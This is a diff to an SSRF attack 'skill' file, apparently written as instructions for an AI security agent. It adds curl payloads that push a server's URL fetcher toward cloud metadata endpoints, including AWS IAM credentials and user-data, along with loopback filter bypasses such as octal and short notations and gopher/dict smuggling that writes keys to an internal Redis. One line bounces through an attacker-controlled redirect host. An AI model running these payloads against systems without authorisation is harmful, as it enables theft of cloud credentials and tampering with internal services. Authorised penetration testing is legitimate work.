@@ -2,6 +2,8 @@
 name: attack-ssrf
 description: Apply when a parameter or feature causes the server to fetch a URL on the client's behalf (webhook, import, preview, PDF/image generation), to test whether that fetch can be redirected to internal services or cloud metadata.
 metadata:
+  acordia:
+    family: web-attack
   cyberstrike:
     source: .cyberstrike/skill/attack-ssrf/SKILL.md
     commit: 359655518
@@ -65,12 +67,18 @@ curl "https://TARGET/api/preview?link=http://127.0.0.1:80"
 # AWS IMDSv1
 curl "https://TARGET/fetch?url=http://169.254.169.254/latest/meta-data/"
 curl "https://TARGET/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+curl "https://TARGET/fetch?url=http://169.254.169.254/latest/user-data/"
 
 # GCP
 curl "https://TARGET/fetch?url=http://metadata.google.internal/computeMetadata/v1/"
+# (requires header: Metadata-Flavor: Google)
 
 # Azure
 curl "https://TARGET/fetch?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01"
+# (requires header: Metadata: true)
+
+# DigitalOcean
+curl "https://TARGET/fetch?url=http://169.254.169.254/metadata/v1/"
 ```
 
 ### Phase 4: Filter Bypass
@@ -85,6 +93,12 @@ curl "https://TARGET/fetch?url=http://0x7f000001/"
 # IPv6
 curl "https://TARGET/fetch?url=http://[::1]/"
 
+# Alternate loopback notations
+curl "https://TARGET/fetch?url=http://0.0.0.0/"
+curl "https://TARGET/fetch?url=http://localhost/"
+curl "https://TARGET/fetch?url=http://127.1/"
+curl "https://TARGET/fetch?url=http://017700000001/"   # octal
+
 # URL encoding
 curl "https://TARGET/fetch?url=http://%31%32%37%2e%30%2e%30%2e%31/"
 
@@ -96,6 +110,8 @@ curl "https://TARGET/fetch?url=http://ATTACKER/redirect?to=http://169.254.169.25
 
 # Protocol smuggling
 curl "https://TARGET/fetch?url=gopher://127.0.0.1:6379/_INFO"
+curl "https://TARGET/fetch?url=gopher://127.0.0.1:6379/_SET%20key%20value"
+curl "https://TARGET/fetch?url=dict://127.0.0.1:6379/SET:key:value"
 ```
 
 ### Phase 5: Internal Port Scanning
